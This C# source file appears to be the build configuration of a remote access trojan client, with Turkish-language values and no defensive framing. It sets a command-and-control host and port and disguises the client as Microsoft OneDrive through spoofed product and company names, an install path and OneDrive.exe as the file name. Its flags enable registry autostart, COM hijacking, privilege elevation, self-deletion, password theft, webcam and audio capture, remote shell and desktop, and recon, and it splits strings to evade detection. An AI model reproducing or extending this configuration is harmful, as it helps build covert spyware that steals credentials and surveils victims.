// Dosya: Models/BuildConfig.cs
using System;

namespace App.Service
{
    public class BuildConfig
    {
        public string Tag = "Test" + "Client";
        public string Mutex = "Glob" + "al\\" + Guid.NewGuid().ToString("N");
        public string AesKey = "C11" + "K_Gizli_Anahtar_2024";
        public bool UseAes = true;
        public bool Unattended = true;

        public string Host = "127.0.0.1";
        public int Port = 4444;
        public string FallbackHost = "";
        public int HeartbeatMs = 60000;
        public bool UseSocks5 = false;
        public string SocksHost = "";
        public int SocksPort = 1080;
        public string SocksUser = "";
        public string SocksPass = "";

        public bool Install = true;
        public string InstallPath = @"%LocalAppData%\Micro" + @"soft\OneDrive";
        public bool HideFile = true;
        public string Autostart = "Registry (Run)";
        public bool AntiVm = false;
        public bool FirewallRule = false;

        public bool AntiDebug = false;
        public bool Elevate = true;
        public int StartDelay = 0;

        public string Product = "Windows Sync " + "Service";
        public string Company = "Micro" + "soft Win" + "dows";
        public string FileVersion = "23.1.0.0";
        public string Packing = "Yok";
        public bool UseBootstrap = false;
        public bool UseUpx = false;
        public bool UseSign = true;

        public bool InputMonitor = false;
        public bool Clipboard = false;
        public string LogFolder = "";
        public bool RemoteDesktop = true;

        public bool PasswordRecovery = true;
        public bool Webcam = true;
        public bool AudioRecord = true;
        public bool EnableTerminal = true;
        public bool EnableShell = true;
        public bool EnableScript = true;
        public bool EnableFileManager = true;
        public bool EnableRegistry = true;
        public bool EnableChat = true;
        public bool EnableAdsLog = true;
        public bool EnableRecon = true;
        public bool AmsiBypass = false;

        public string OutputName = "OneDrive.exe";

        public int NetMode = 0;
        public bool UseTls = false;
        public bool UseDns = false;
        public bool Jitter = false;
        public bool Attach = false;
        public bool UseDll = false;
        public bool DllHijack = false;
        public bool ComHijack = true;
        public bool Winlogon = false;
        public string LockPass = "c11" + "k";

        public bool LoaderMode = false;
        public bool MemoryOnly = false;
        public int MemoryMode = 0;
        public bool ExplorerBind = false;
        public bool SelfDelete = true;
        public bool Stage0File = false;
        public string Stage0Path = @"%LocalAppData%\Micro" + @"soft\OneDrive\";
        public bool DllPayload = false;
        public int ElevateTries = 3;
    }
}